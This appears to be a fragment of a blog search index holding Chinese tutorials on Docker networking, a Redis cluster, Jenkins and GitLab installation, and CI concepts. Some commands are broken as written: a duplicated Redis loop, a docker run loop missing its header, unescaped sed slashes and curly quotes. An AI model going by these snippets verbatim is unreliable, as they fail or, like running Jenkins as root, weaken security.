\"779b38cb0d482db5eb7156e0ba327da1740a86d71106438f27f22f6ceee2e82e\", \"Created\": \"20","date":"2021-04-06","objectID":"/posts/docker%E5%9F%BA%E7%A1%80/:27:0","tags":["docker基础"],"title":"Docker基础","uri":"/posts/docker%E5%9F%BA%E7%A1%80/"},{"categories":["运维"],"content":"网络互通 测试 [root@jd ~]# docker run -d -P --name tomcat01 tomcat 999d0f449539783be990b3bb36f5036a4dc4419a8cfba1ffe9907e0bc08352d6 [root@jd ~]# docker run -d -P --name tomcat02 tomcat 5b6d4843a2fe7aede6cc377f4825dfb014bf035333ecf16d739576dc1a9b3237 [root@jd ~]# docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 5b6d4843a2fe tomcat \"catalina.sh run\" 6 seconds ago Up 5 seconds 0.0.0.0:49160-\u003e8080/tcp tomcat02 999d0f449539 tomcat \"catalina.sh run\" 16 seconds ago Up 16 seconds 0.0.0.0:49159-\u003e8080/tcp tomcat01 1ccb18d09020 tomcat \"catalina.sh run\" 15 minutes ago Up 15 minutes 0.0.0.0:49158-\u003e8080/tcp tomcat-net-02 56554c258e04 tomcat \"catalina.sh run\" 15 minutes ago Up 15 minutes 0.0.0.0:49157-\u003e8080/tcp tomcat-net-01 [root@jd ~]# docker network connect mytestnet tomcat01 [root@jd ~]# docker network inspect mytestnet 连通之后就是将tomcat01放在了mytestnet网络下 其实就是一个容器两个IP [root@jd ~]# docker exec -it tomcat-net-01 ping tomcat01 PING tomcat01 (192.168.0.4) 56(84) bytes of data. 64 bytes from tomcat01.mytestnet (192.168.0.4): icmp_seq=1 ttl=64 time=0.126 ms 64 bytes from tomcat01.mytestnet (192.168.0.4): icmp_seq=2 ttl=64 time=0.083 ms 64 bytes from tomcat01.mytestnet (192.168.0.4): icmp_seq=3 ttl=64 time=0.084 ms tomcat02依旧不同 加入需要跨网络操作容器，就需要使用dockers network connect mytestnet tomcat-sjvbk ","date":"2021-04-06","objectID":"/posts/docker%E5%9F%BA%E7%A1%80/:28:0","tags":["docker基础"],"title":"Docker基础","uri":"/posts/docker%E5%9F%BA%E7%A1%80/"},{"categories":["运维"],"content":"部署redis集群 分片+高可用+负载均衡 # 创建网络 docker network create redis-net --subnet 172.38.0.0/16 docker network ls docker network inspect redis-net # 通过脚本创建6个redis for port in $(seq 1 6); \\ do \\ mkdir -p /mydata/redis/node-${port}/conf touch /mydata/redis/node-${port}/conf/redis.conf cat \u003c\u003c EOF \u003e/mydata/redis/node-${port}/conf/redis.conf port 6379 bind 0.0.0.0 cluster-enabled yes cluster-config-file nodes.conf cluster-node-timeout 5000 cluster-announce-ip 172.38.0.1${port} cluster-announce-port 6379 cluster-announce-bus-port 16379 appendonly yes EOF done for port in $(seq 1 6); \\ do \\ mkdir -p /mydata/redis/node-${port}/conf touch /mydata/redis/node-${port}/conf/redis.conf cat \u003c\u003c EOF \u003e/mydata/redis/node-${port}/conf/redis.conf port 6379 bind 0.0.0.0 cluster-enabled yes cluster-config-file nodes.conf cluster-node-timeout 5000 cluster-announce-ip 172.38.0.1${port} cluster-announce-port 6379 cluster-announce-bus-port 16379 appendonly yes EOF done # 创建6个redis节点 docker run -p 6371:6379 -p 16371:16379 --name redis-1 \\ -v /mydata/redis/node-1/data:/data \\ -v /mydata/redis/node-1/conf/redis.conf:/etc/redis/redis.conf \\ -d --net redis-net --ip 172.38.0.11 redis:5.0.9-alpine3.11 redis-server /etc/redis/redis.conf docker run -p 6373:6379 -p 16373:16379 --name redis-3 \\ -v /mydata/redis/node-3/data:/data \\ -v /mydata/redis/node-3/conf/redis.conf:/etc/redis/redis.conf \\ -d --net redis-net --ip 172.38.0.13 redis:5.0.9-alpine3.11 redis-server /etc/redis/redis.conf # 通过脚本一次启动6个redis容器 docker run -p 637${port}:6379 -p 1637${port}:16379 --name redis-${port} \\ -v /mydata/redis/node-${port}/data:/data \\ -v /mydata/redis/node-${port}/conf/redis.conf:/etc/redis/redis.conf \\ -d --net redis --ip 172.38.0.1${port} redis:5.0.9-alpine3.11 redis-server /etc/redis/redis.conf done docker ps # 交互模式进节点 docker exec -it redis-1 /bin/sh # 创建redis集群 redis-cli --cluster create 172.38.0.11:6379 172.38.0.12:6379 \\ 172.38.0.13:6379 172.38.0.14:6379 172.38.0.15:6379 \\ 172.38.0.16:6379 --cluster-replicas 1 # 输入yes 测试 re","date":"2021-04-06","objectID":"/posts/docker%E5%9F%BA%E7%A1%80/:29:0","tags":["docker基础"],"title":"Docker基础","uri":"/posts/docker%E5%9F%BA%E7%A1%80/"},{"categories":["运维"],"content":"预先安装docker、docker-compose环境 拉取Jenkins镜像，运行容器： docker run --name myjenkins -p 9980:8080 -p 50000:50000 -v /var/jenkins_home jenkins：2.60.3 映射端口为本地9980映射内部8080端口，50000映射50000端口。 学习Jenkins的DockerFile： FROM openjdk:8-jdk RUN apt-get update \u0026\u0026 apt-get install -y git curl \u0026\u0026 rm -rf /var/lib/apt/lists/* ARG user=jenkins ARG group=jenkins ARG uid=1000 ARG gid=1000 ARG http_port=8080 ARG agent_port=50000 ENV JENKINS_HOME /var/jenkins_home ENV JENKINS_SLAVE_AGENT_PORT ${agent_port} # Jenkins is run with user `jenkins`, uid = 1000 # If you bind mount a volume from the host or a data container, # ensure you use the same uid RUN groupadd -g ${gid} ${group} \\ \u0026\u0026 useradd -d \"$JENKINS_HOME\" -u ${uid} -g ${gid} -m -s /bin/bash ${user} # Jenkins home directory is a volume, so configuration and build history # can be persisted and survive image upgrades VOLUME /var/jenkins_home # `/usr/share/jenkins/ref/` contains all reference configuration we want # to set on a fresh new installation. Use it to bundle additional plugins # or config file with your custom jenkins Docker image. RUN mkdir -p /usr/share/jenkins/ref/init.groovy.d ENV TINI_VERSION 0.14.0 ENV TINI_SHA 6c41ec7d33e857d4779f14d9c74924cab0c7973485d2972419a3b7c7620ff5fd # Use tini as subreaper in Docker container to adopt zombie processes RUN curl -fsSL https://github.com/krallin/tini/releases/download/v${TINI_VERSION}/tini-static-amd64 -o /bin/tini \u0026\u0026 chmod +x /bin/tini \\ \u0026\u0026 echo \"$TINI_SHA /bin/tini\" | sha256sum -c - COPY init.groovy /usr/share/jenkins/ref/init.groovy.d/tcp-slave-agent-port.groovy # jenkins version being bundled in this docker image ARG JENKINS_VERSION ENV JENKINS_VERSION ${JENKINS_VERSION:-2.60.3} # jenkins.war checksum, download will be validated using it ARG JENKINS_SHA=2d71b8f87c8417f9303a73d52901a59678ee6c0eefcf7325efed6035ff39372a # Can be used to customize where jenkins.war get downloaded from ARG JENKINS_URL=https://repo.jenkins-ci.org/public/org/jenkins-ci/main/jenkins-war/${JENKINS_VERSION}/jenkins-w","date":"2021-04-06","objectID":"/posts/jenkins%E5%AE%89%E8%A3%85/:0:0","tags":["jenkins"],"title":"jenkins安装","uri":"/posts/jenkins%E5%AE%89%E8%A3%85/"},{"categories":["运维"],"content":"初始化 初始化过程中会提示出密码： ************************************************************* ************************************************************* ************************************************************* Jenkins initial setup is required. An admin user has been created and a password generated. Please use the following password to proceed to installation: a8e55644a46a468497388c8f771e9923 This may also be found at: /var/jenkins_home/secrets/initialAdminPassword 如果-d后台运行，那么前台不会出现日志，此时，密码会记录再日志中，访问Jenkins：localhost:9980，发现密码提示： C:\\Users\\26505\u003edocker exec -it myjenkins /bin/bash jenkins@22ef3b5b9610:/$ cat /var/jenkins_home/secrets/initialAdminPassword a8e55644a46a468497388c8f771e9923 然后输入密码，进入配置：下载插件过程中不下载任何插件，进入配置超级管理员用户密码： http://updates.jenkins-ci.org/update-center.json ","date":"2021-04-06","objectID":"/posts/jenkins%E5%AE%89%E8%A3%85/:1:0","tags":["jenkins"],"title":"jenkins安装","uri":"/posts/jenkins%E5%AE%89%E8%A3%85/"},{"categories":["运维"],"content":"1 、持续集成及Jenkins介绍 2 、Jenkins安装和持续集成环境配置 3 、Jenkins构建Maven项目 4 、Jenkins+Docker+SpringCloud微服务持续集成 5 、基于Kubernetes/K8S构建Jenkins微服务持续集成平台 ","date":"2021-04-06","objectID":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/:0:0","tags":["jenkins"],"title":"Jenkins持续集成入门到精通","uri":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/"},{"categories":["运维"],"content":"1 、持续集成及Jenkins介绍 ","date":"2021-04-06","objectID":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/:1:0","tags":["jenkins"],"title":"Jenkins持续集成入门到精通","uri":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/"},{"categories":["运维"],"content":"软件开发生命周期 软件开发生命周期又叫做SDLC（Software Development Life Cycle），它是集合了计划、开发、测试 和部署过程的集合。如下图所示 ： 需求分析 这是生命周期的第一阶段，根据项目需求，团队执行一个可行性计划的分析。项目需求可能是公司内部 或者客户提出的。这阶段主要是对信息的收集，也有可能是对现有项目的改善和重新做一个新的项目。 还要分析项目的预算多长，可以从哪方面受益及布局，这也是项目创建的目标。 设计 第二阶段就是设计阶段，系统架构和满意状态（就是要做成什么样子，有什么功能），和创建一个项目 计划。计划可以使用图表，布局设计或者文者的方式呈现。 实现 优势 劣势 简单易用和理解 各个阶段的划分完全固定，阶段之间产生大量的文档，极大地增加了工作量。 当前一阶段完成后，您只需要 去关注后续阶段。 由于开发模型是线性的，用户只有等到整个过程的末期才能见 到开发成果，从而增加了开发风险。 为项目提供了按阶段划分的检 查节点 瀑布模型的突出缺点是不适应用户需求的变化。 第三阶段就是实现阶段，项目经理创建和分配工作给开者，开发者根据任务和在设计阶段定义的目标进 行开发代码。依据项目的大小和复杂程度，可以需要数月或更长时间才能完成。 测试 测试人员进行代码测试 ，包括功能测试、代码测试、压力测试等。 进化 最后进阶段就是对产品不断的进化改进和维护阶段，根据用户的使用情况，可能需要对某功能进行修 改，bug修复，功能增加等。 ","date":"2021-04-06","objectID":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/:2:0","tags":["jenkins"],"title":"Jenkins持续集成入门到精通","uri":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/"},{"categories":["运维"],"content":"软件开发瀑布模型 瀑布模型是最著名和最常使用的软件开发模型。瀑布模型就是一系列的软件开发过程。它是由制造业繁 衍出来的。一个高度化的结构流程在一个方向上流动，有点像生产线一样。在瀑布模型创建之初，没有 其它开发的模型，有很多东西全靠开发人员去猜测，去开发。这样的模型仅适用于那些简单的软件开 发， 但是已经不适合现在的开发了。 下图对软件开发模型的一个阐述。 ","date":"2021-04-06","objectID":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/:2:1","tags":["jenkins"],"title":"Jenkins持续集成入门到精通","uri":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/"},{"categories":["运维"],"content":"软件的敏捷开发 什么是敏捷开发？ 敏捷开发（Agile Development） 的核心是迭代开发（Iterative Development） 与 增量开发 （Incremental Development） 。 ===何为迭代开发？=== 对于大型软件项目，传统的开发方式是采用一个大周期（比如一年）进行开发，整个过程就是一次\"大 开发\"；迭代开发的方式则不一样，它将开发过程拆分成多个小周期，即一次\"大开发\"变成多次\"小开 发\"，每次小开发都是同样的流程，所以看上去就好像重复在做同样的步骤。 举例来说，SpaceX 公司想造一个大推力火箭，将人类送到火星。但是，它不是一开始就造大火箭，而 是先造一个最简陋的小火箭 Falcon 1。结果，第一次发射就爆炸了，直到第四次发射，才成功进入轨 道。然后，开发了中型火箭 Falcon 9，九年中发射了 70 次。最后，才开发 Falcon 重型火箭。如果 SpaceX 不采用迭代开发，它可能直到现在还无法上天。 ===何为增量开发？=== 软件的每个版本，都会新增一个用户可以感知的完整功能。也就是说，按照新增功能来划分迭代。 举例来说，房产公司开发一个 10 栋楼的小区。如果采用增量开发的模式，该公司第一个迭代就是交付一 号楼，第二个迭代交付二号楼……每个迭代都是完成一栋完整的楼。而不是第一个迭代挖好 10 栋楼的地 基，第二个迭代建好每栋楼的骨架，第三个迭代架设屋顶…… 敏捷开发如何迭代？ 虽然敏捷开发将软件开发分成多个迭代，但是也要求，每次迭代都是一个完整的软件开发周期，必须按 照软件工程的方法论，进行正规的流程管理。 敏捷开发有什么好处？ ==早期交付== 敏捷开发的第一个好处，就是早期交付，从而大大降低成本。 还是以上一节的房产公司为例，如果按照 传统的\"瀑布开发模式\"，先挖 10 栋楼的地基、再盖骨架、然后架设屋顶，每个阶段都等到前一个阶段完 成后开始，可能需要两年才能一次性交付 10 栋楼。也就是说，如果不考虑预售，该项目必须等到两年后 才能回款。 敏捷开发是六个月后交付一号楼，后面每两个月交付一栋楼。因此，半年就能回款10%，后 面每个月都会有现金流，资金压力就大大减轻了。 ==降低风险=== 敏捷开发的第二个好处是，及时了解市场需求，降低产品不适用的风险。 请想一想，哪一种情况损失比 较小： 10 栋楼都造好以后，才发现卖不出去，还是造好第一栋楼，就发现卖不出去，从而改进或停建后 面 9 栋楼？ ","date":"2021-04-06","objectID":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/:2:2","tags":["jenkins"],"title":"Jenkins持续集成入门到精通","uri":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/"},{"categories":["运维"],"content":"什么是持续集成 持续集成（ Continuous integration ， 简称 CI ）指的是，频繁地（一天多次）将代码集成到主干。 持续集成的目的，就是让产品可以快速迭代，同时还能保持高质量。它的核心措施是，代码集成到主干 之前，必须通过自动化测试。只要有一个测试用例失败，就不能集成。 通过持续集成， 团队可以快速的从一个功能到另一个功能，简而言之，敏捷软件开发很大一部分都要归 功于持续集成。 === 持续集成的流程=== 根据持续集成的设计，代码从提交到生产，整个过程有以下几步。 提交 流程的第一步，是开发者向代码仓库提交代码。所有后面的步骤都始于本地代码的一次提交 （commit）。 测试（第一轮） 代码仓库对commit操作配置了钩子（hook），只要提交代码或者合并进主干，就会跑自动化测试。 构建 通过第一轮测试，代码就可以合并进主干，就算可以交付了。 交付后，就先进行构建（build），再进入第二轮测试。所谓构建，指的是将源码转换为可以运行的实 际代码，比如安装依赖，配置各种资源（样式表、JS脚本、图片）等等。 测试（第二轮） 构建完成，就要进行第二轮测试。如果第一轮已经涵盖了所有测试内容，第二轮可以省略，当然，这时 构建步骤也要移到第一轮测试前面。 部署 过了第二轮测试，当前代码就是一个可以直接部署的版本（artifact）。将这个版本的所有文件打包（ tar filename.tar * ）存档，发到生产服务器。 回滚 一旦当前版本发生问题，就要回滚到上一个版本的构建结果。最简单的做法就是修改一下符号链接，指 向上一个版本的目录。 ","date":"2021-04-06","objectID":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/:2:3","tags":["jenkins"],"title":"Jenkins持续集成入门到精通","uri":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/"},{"categories":["运维"],"content":"持续集成的组成要素 一个自动构建过程， 从检出代码、 编译构建、 运行测试、 结果记录、 测试统计等都是自动完成 的， 无需人工干预。 一个代码存储库，即需要版本控制软件来保障代码的可维护性，同时作为构建过程的素材库，一般 使用SVN或Git。 一个持续集成服务器， Jenkins 就是一个配置简单和使用方便的持续集成服务器。 ","date":"2021-04-06","objectID":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/:2:4","tags":["jenkins"],"title":"Jenkins持续集成入门到精通","uri":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/"},{"categories":["运维"],"content":"持续集成的好处 1 、降低风险，由于持续集成不断去构建，编译和测试，可以很早期发现问题，所以修复的代价就少； 2 、对系统健康持续检查，减少发布风险带来的问题； 3 、减少重复性工作； 4 、持续部署，提供可部署单元包； 5 、持续交付可供使用的版本； 6 、增强团队信心； ","date":"2021-04-06","objectID":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/:2:5","tags":["jenkins"],"title":"Jenkins持续集成入门到精通","uri":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/"},{"categories":["运维"],"content":"Jenkins介绍 Jenkins 是一款流行的开源持续集成（Continuous Integration）工具，广泛用于项目开发，具有自动 化构建、测试和部署等功能。官网： http://jenkins-ci.org/。 Jenkins的特征： 开源的Java语言开发持续集成工具，支持持续集成，持续部署。 易于安装部署配置：可通过yum安装,或下载war包以及通过docker容器等快速实现安装部署，可 方便web界面配置管理。 消息通知及测试报告：集成RSS/E-mail通过RSS发布构建结果或当构建完成时通过e-mail通知，生 成JUnit/TestNG测试报告。 名称 IP地址 安装的软件 代码托管服务 器 192.168.66.100 Gitlab-12.4. 持续集成服务 器 192.168.66. Jenkins-2.190.3，JDK1.8，Maven3.6.2，Git， SonarQube 应用测试服务 器 192.168.66.102 JDK1.8，Tomcat8. 分布式构建：支持Jenkins能够让多台计算机一起构建/测试。 文件识别：Jenkins能够跟踪哪次构建生成哪些jar，哪次构建使用哪个版本的jar等。 丰富的插件支持：支持扩展插件，你可以开发适合自己团队使用的工具，如git，svn，maven， docker等。 ","date":"2021-04-06","objectID":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/:2:6","tags":["jenkins"],"title":"Jenkins持续集成入门到精通","uri":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/"},{"categories":["运维"],"content":"2 、Jenkins安装和持续集成环境配置 ","date":"2021-04-06","objectID":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/:3:0","tags":["jenkins"],"title":"Jenkins持续集成入门到精通","uri":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/"},{"categories":["运维"],"content":"持续集成流程说明 1 ）首先，开发人员每天进行代码提交，提交到Git仓库 2 ）然后，Jenkins作为持续集成工具，使用Git工具到Git仓库拉取代码到集成服务器，再配合JDK， Maven等软件完成代码编译，代码测试与审查，测试，打包等工作，在这个过程中每一步出错，都重新 再执行一次整个流程。 3 ）最后，Jenkins把生成的jar或war包分发到测试服务器或者生产服务器，测试人员或用户就可以访问 应用。 服务器列表 本课程虚拟机统一采用CentOS7。 ","date":"2021-04-06","objectID":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/:3:1","tags":["jenkins"],"title":"Jenkins持续集成入门到精通","uri":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/"},{"categories":["运维"],"content":"Gitlab代码托管服务器安装 Gitlab简介 官网： https://about.gitlab.com/ GitLab 是一个用于仓库管理系统的开源项目，使用Git作为代码管理工具，并在此基础上搭建起来的 web服务。 GitLab和GitHub一样属于第三方基于Git开发的作品，免费且开源（基于MIT协议），与Github类似， 可以注册用户，任意提交你的代码，添加SSHKey等等。不同的是，GitLab是可以部署到自己的服务器 上，数据库等一切信息都掌握在自己手上，适合团队内部协作开发，你总不可能把团队内部的智慧总放 在别人的服务器上吧？简单来说可把GitLab看作个人版的GitHub。 Gitlab安装 安装相关依赖 yum -y install policycoreutils openssh-server openssh-clients postfix 启动ssh服务\u0026设置为开机启动 systemctl enable sshd \u0026\u0026 sudo systemctl start sshd 设置postfix开机自启，并启动，postfix支持gitlab发信功能 systemctl enable postfix \u0026\u0026 systemctl start postfix 开放ssh以及http服务，然后重新加载防火墙列表 firewall-cmd –add-service=ssh –permanent firewall-cmd –add-service=http –permanent firewall-cmd –reload 如果关闭防火墙就不需要做以上配置 下载gitlab包，并且安装 在线下载安装包： wget https://mirrors.tuna.tsinghua.edu.cn/gitlab-ce/yum/el6/gitlab-ce-12.4.2-ce.0.el6.x 86_64.rpm 安装： rpm -i gitlab-ce-12.4.2-ce.0.el6.x86_64.rpm 修改gitlab配置 vi /etc/gitlab/gitlab.rb 修改gitlab访问地址和端口，默认为 80 ，我们改为 82 external_url ‘http://192.168.66.100:82’ nginx[’listen_port’] = 82 重载配置及启动gitlab gitlab-ctl reconfigure gitlab-ctl restart 把端口添加到防火墙 firewall-cmd –zone=public –add-port=82/tcp –permanent firewall-cmd –reload 启动成功后，看到以下修改管理员root密码的页面，修改密码后，然后登录即可 Gitlab添加组、创建用户、创建项目 1 ）创建组 使用管理员 root 创建组，一个组里面可以有多个项目分支，可以将开发添加到组里面进行设置权限， 不同的组就是公司不同的开发项目或者服务模块，不同的组添加不同的开发即可实现对开发设置权限的 管理 2 ）创建用户 创建用户的时候，可以选择Regular或Admin类型。 创建完用户后，立即修改密码 3 ）将用户添加到组中 选择某个用户组，进行Members管理组的成员 Gitlab用户在组里面有 5 种不同权限： Guest：可以创建issue、发表评论，不能读写版本库 Reporter：可以克隆代码，不能提交，QA、PM 可以赋予这个权限 Developer：可以克隆代码、开发、提交、push，普通开发可以赋予这个权限 Maintainer：可以创建项目、添加tag、保护分支、添加项目成员、编辑项目，核心开发可以赋予这个 权限 Owner：可以设置项目访问权限 - Visibility Level、删除项目、迁移项目、管理组成员，开发组组 长可以赋予这个权限 4 ）在用户组中创建项目 以刚才创建的新用户身份登录到Gitlab，然后在用户组中创建新的项目 ","date":"2021-04-06","objectID":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/:3:2","tags":["jenkins"],"title":"Jenkins持续集成入门到精通","uri":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/"},{"categories":["运维"],"content":"源码上传到Gitlab仓库 下面来到IDEA开发工具，我们已经准备好一个简单的Web应用准备到集成部署。 我们要把源码上传到Gitlab的项目仓库中。 1 ）项目结构说明 我们建立了一个非常简单的web应用，只有一个index.jsp页面，如果部署好，可以访问该页面就成功 啦！ 2 ）开启版本控制 2 ）提交代码到本地仓库 先Add到缓存区 再Commit到本地仓库 3 ）推送到Gitlab项目仓库中 这时都Gitlab的项目中拷贝url地址 输入gitlab的用户名和密码，然后就可以把代码推送到远程仓库啦 刷新gitlab项目 ","date":"2021-04-06","objectID":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/:3:3","tags":["jenkins"],"title":"Jenkins持续集成入门到精通","uri":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/"},{"categories":["运维"],"content":"持续集成环境(1)-Jenkins安装 1 ）安装JDK Jenkins需要依赖JDK，所以先安装JDK1. yum install java-1.8.0-openjdk* -y 安装目录为：/usr/lib/jvm 2 ）获取jenkins安装包 下载页面：https://jenkins.io/zh/download/ 安装文件：jenkins-2.190.3-1.1.noarch.rpm 3 ）把安装包上传到192.168.66.101服务器，进行安装 rpm -ivh jenkins-2.190.3-1.1.noarch.rpm 4 ）修改Jenkins配置 vi /etc/syscofig/jenkins 修改内容如下： JENKINS_USER=“root” JENKINS_PORT=“8888” 5 ）启动Jenkins systemctl start jenkins 6 ）打开浏览器访问 http://192.168.66.101: 注意：本服务器把防火墙关闭了，如果开启防火墙，需要在防火墙添加端口 7 ）获取并输入admin账户密码 cat /var/lib/jenkins/secrets/initialAdminPassword 8 ）跳过插件安装 因为Jenkins插件需要连接默认官网下载，速度非常慢，而且经过会失败，所以我们暂时先跳过插件安 装 9 ）添加一个管理员账户，并进入Jenkins后台 保存并完成 开始使用Jenkins ","date":"2021-04-06","objectID":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/:3:4","tags":["jenkins"],"title":"Jenkins持续集成入门到精通","uri":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/"},{"categories":["运维"],"content":"持续集成环境(2)-Jenkins插件管理 Jenkins本身不提供很多功能，我们可以通过使用插件来满足我们的使用。例如从Gitlab拉取代码，使用 Maven构建项目等功能需要依靠插件完成。接下来演示如何下载插件。 修改Jenkins插件下载地址 Jenkins国外官方插件地址下载速度非常慢，所以可以修改为国内插件地址： Jenkins-\u003eManage Jenkins-\u003eManage Plugins，点击Available 这样做是为了把Jenkins官方的插件列表下载到本地，接着修改地址文件，替换为国内插件地址 cd /var/lib/jenkins/updates sed -i ’s/http://updates.jenkins- ci.org/download/https://mirrors.tuna.tsinghua.edu.cn/jenkins/g’ default.json \u0026\u0026 sed -i ’s/http://www.google.com/https://www.baidu.com/g’ default.json 最后，Manage Plugins点击Advanced，把Update Site改为国内插件下载地址 https://mirrors.tuna.tsinghua.edu.cn/jenkins/updates/update-center.json Sumbit后，在浏览器输入： http://192.168.66.101:8888/restart ，重启Jenkins。 下载中文汉化插件 Jenkins-\u003eManage Jenkins-\u003eManage Plugins，点击Available，搜索\"Chinese\" 完成后如下图： 重启Jenkins后，就看到Jenkins汉化了！（PS：但可能部分菜单汉化会失败） ","date":"2021-04-06","objectID":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/:3:5","tags":["jenkins"],"title":"Jenkins持续集成入门到精通","uri":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/"},{"categories":["运维"],"content":"持续集成环境(3)-Jenkins用户权限管理 我们可以利用Role-based Authorization Strategy 插件来管理Jenkins用户权限 安装Role-based Authorization Strategy插件 开启权限全局安全配置 授权策略切换为\"Role-Based Strategy\"，保存 创建角色 在系统管理页面进入 Manage and Assign Roles 点击\"Manage Roles\" Global roles（全局角色）：管理员等高级用户可以创建基于全局的角色 Project roles（项目角色）： 针对某个或者某些项目的角色 Slave roles（奴隶角色）：节点相关的权限 我们添加以下三个角色： baseRole：该角色为全局角色。这个角色需要绑定Overall下面的Read权限，是为了给所有用户绑 定最基本的Jenkins访问权限。注意：如果不给后续用户绑定这个角色，会报错误：用户名 is missing the Overall/Read permission role1：该角色为项目角色。使用正则表达式绑定\"itcast.\"，意思是只能操作itcast开头的项目。 role2：该角色也为项目角色。绑定\"itheima.\"，意思是只能操作itheima开头的项目。 保存。 创建用户 在系统管理页面进入 Manage Users 分别创建两个用户：jack和eric 给用户分配角色 系统管理页面进入Manage and Assign Roles，点击Assign Roles 绑定规则如下： eric用户分别绑定baseRole和role1角色 jack用户分别绑定baseRole和role2角色 保存。 创建项目测试权限 以itcast管理员账户创建两个项目，分别为itcast01和itheima01 结果为： eric用户登录，只能看到itcast01项目 jack用户登录，只能看到itheima01项目 ","date":"2021-04-06","objectID":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/:3:6","tags":["jenkins"],"title":"Jenkins持续集成入门到精通","uri":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/"},{"categories":["运维"],"content":"持续集成环境(4)-Jenkins凭证管理 凭据可以用来存储需要密文保护的数据库密码、Gitlab密码信息、Docker私有仓库密码等，以便 Jenkins可以和这些第三方的应用进行交互。 安装Credentials Binding插件 要在Jenkins使用凭证管理功能，需要安装Credentials Binding插件 安装插件后，左边多了\"凭证\"菜单，在这里管理所有凭证 可以添加的凭证有 5 种： Username with password：用户名和密码 SSH Username with private key： 使用SSH用户和密钥 Secret file：需要保密的文本文件，使用时Jenkins会将文件复制到一个临时目录中，再将文件路径 设置到一个变量中，等构建结束后，所复制的Secret file就会被删除。 Secret 